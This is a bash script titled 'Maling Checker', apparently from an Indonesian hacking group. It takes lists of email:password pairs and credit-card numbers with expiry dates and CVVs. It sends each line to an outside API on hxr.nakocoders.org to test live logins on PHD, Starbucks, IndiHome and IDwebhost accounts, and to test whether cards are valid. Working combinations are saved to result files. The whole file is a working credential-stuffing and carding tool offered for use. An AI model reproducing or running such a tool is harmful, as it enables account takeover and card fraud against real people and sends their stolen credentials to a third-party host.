#!/bin/bash
#coded By Arvan Apriyana a.k.a Aylward [Nako48]
waktu=$(date '+%Y-%m-%d %H:%M:%S')
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
header(){
printf "${GREEN}
         ####################################
         ####################################
         #######                      #######
         #######                      #######${BLUE}
         ####### www.tatsumi-crew.net #######
         ###############      ###############
         ###############      ###############
         ###############      ###############
         ###############      ###############${RED}
         #######    ####      ####    #######
         #######    ####      ####    #######
         #######    ##############    #######
         #######    ##############    #######
         #######                      #######
         ####################################
         ####################################${NOCOLOR}
         ------------------------------------
            Maling Checker By Nakocoders69
         ------------------------------------
"
}
phd(){
    curlnya=$(curl -s "http://hxr.nakocoders.org/phd-id/api/api.php?emailna=$1&passwordna=$2" -L)    
    livena=$(echo $curlnya | grep -Po '(?<="msg":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    if [[ ! $livena =~ "DIE" ]]; then
    printf "${NOCOLOR}[$i]${GREEN}[LIVE] => $1:$2\n"
    echo "$1|$2" >> resultphd.txt
    else
    printf "${NOCOLOR}[$i]${RED}[DIE] => $1:$2${NC}\n"
fi
}
sbux(){
    curlnya=$(curl -s "https://hxr.nakocoders.org/sbux/api/api.php?emailna=$1&passwordna=$2" -L)    
    livena=$(echo $curlnya | grep -Po '(?<="msg":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    if [[ ! $livena =~ "Account Die" ]]; then
    printf "${NOCOLOR}[$i]${GREEN}[LIVE] => $1:$2\n"
    echo "$1|$2" >> resultsbux.txt
    else
    printf "${NOCOLOR}[$i]${RED}[DIE] => $1:$2${NC}\n"
fi
}
indihome(){
    curlnya=$(curl -s "https://hxr.nakocoders.org/indihomo/api/api.php?emailna=$1&passwordna=$2" -L)    
    livena=$(echo $curlnya | grep -Po '(?<="msg":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    if [[ ! $livena =~ "DIE" ]]; then
    printf "${NOCOLOR}[$i]${GREEN}[LIVE] => $1:$2\n"
    echo "$1|$2" >> resultindihome.txt
    else
    printf "${NOCOLOR}[$i]${RED}[DIE] => $1:$2${NC}\n"
fi
}
idwebhost(){
    curlnya=$(curl -s "https://hxr.nakocoders.org/idwebhost/api/api.php?emailna=$1&passwordna=$2" -L)    
    livena=$(echo $curlnya | grep -Po '(?<="msg":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    if [[ ! $livena =~ "DIE" ]]; then
    printf "${NOCOLOR}[$i]${GREEN}[LIVE] => $1:$2\n"
    echo "$1|$2" >> resultidwebhost.txt
    else
    printf "${NOCOLOR}[$i]${RED}[DIE] => $1:$2${NC}\n"
fi
}
ccchecker(){
    curlnya=$(curl -s "https://hxr.nakocoders.org/api.php?inputcc=$1&inputbulan=$2&inputtahun=$3&inputccv=$4" -L)
    binna=$(curl -s "https://lookup.binlist.net/$1" -L)
    livena=$(echo $curlnya | grep -Po '(?<="code":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    bincc=$(echo $binna | grep -Po '(?<="name":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    scheme1=$(echo $binna | grep -Po '(?<="scheme":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    typena1=$(echo $binna | grep -Po '(?<="type":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    if [[ ! $livena =~ "card_declined" ]]; then
        printf "\n${HIJAU}[LIVE] $1|$2|$3|$4 [$bincc/$scheme1-$typena1] [$waktu]\n";
        echo "$1|$2|$3|$4 [LIVE] [$bincc/$scheme1-$typena1] [$waktu]" >> resultcc.txt
        printf "${NORMAL}"
    else
        printf "$1|$2|$3|$4 ${MERAH}[DIE] [$bincc/$scheme1-$typena1] [$waktu]";
        echo ""
        printf "${NORMAL}"
    fi
}
header
echo "Method : "
echo "1. PHD-Account Checker"
echo "2. SBUX-Account Checker"
echo "3. INDIHOME-Account Checker"
echo "4. IDWEBHOST-Account Checker"
echo "5. Credit-Card Checker [FastCheck]"
read -p "Choose Your Method : " method;
##PHD
if [ $method -eq 1 ]; then
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> email:password "
echo -n "Masukan File List : "
    read list
    if [ ! -f $list ]; then
echo "$list No Such File"
    exit
    fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
    for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
        emailna="${emailgblg[$i]}"
        kontol="${passwordna[$i]}"
        phd $emailna $kontol
    done
elif [ $method -eq "2" ]; then
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> email:password "
echo -n "Masukan File List : "
    read list
    if [ ! -f $list ]; then
echo "$list No Such File"
    exit
    fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
    for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
        emailna="${emailgblg[$i]}"
        kontol="${passwordna[$i]}"
        sbux $emailna $kontol
    done
##DELETE FRIEND
elif [ $method -eq "3" ]; then
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> email:password "
echo -n "Masukan File List : "
    read list
    if [ ! -f $list ]; then
echo "$list No Such File"
    exit
    fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
    for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
        emailna="${emailgblg[$i]}"
        kontol="${passwordna[$i]}"
        indihome $emailna $kontol
    done
elif [ $method -eq "4" ]; then
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> email:password "
echo -n "Masukan File List : "
    read list
    if [ ! -f $list ]; then
echo "$list No Such File"
    exit
    fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
    for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
        emailna="${emailgblg[$i]}"
        kontol="${passwordna[$i]}"
        idwebhost $emailna $kontol
    done
elif [ $method -eq "5" ]; then
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> ccnum:bulan:tahun:ccv "
echo -n "Masukan File List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    z=$(gawk -F: '{ print $3 }' $list)
    h=$(gawk -F: '{ print $4 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'ccnum=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'exp1=($y)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'exp2=($z)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'ccv=($h)'
for (( i = 0; i < "${#ccnum[@]}"; i++ )); do
    ccnumberna="${ccnum[$i]}"
    bulanna="${exp1[$i]}"
    tahunna="${exp2[$i]}"
    ccvna="${ccv[$i]}"
        ccchecker $ccnumberna $bulanna $tahunna $ccvna
done
fi
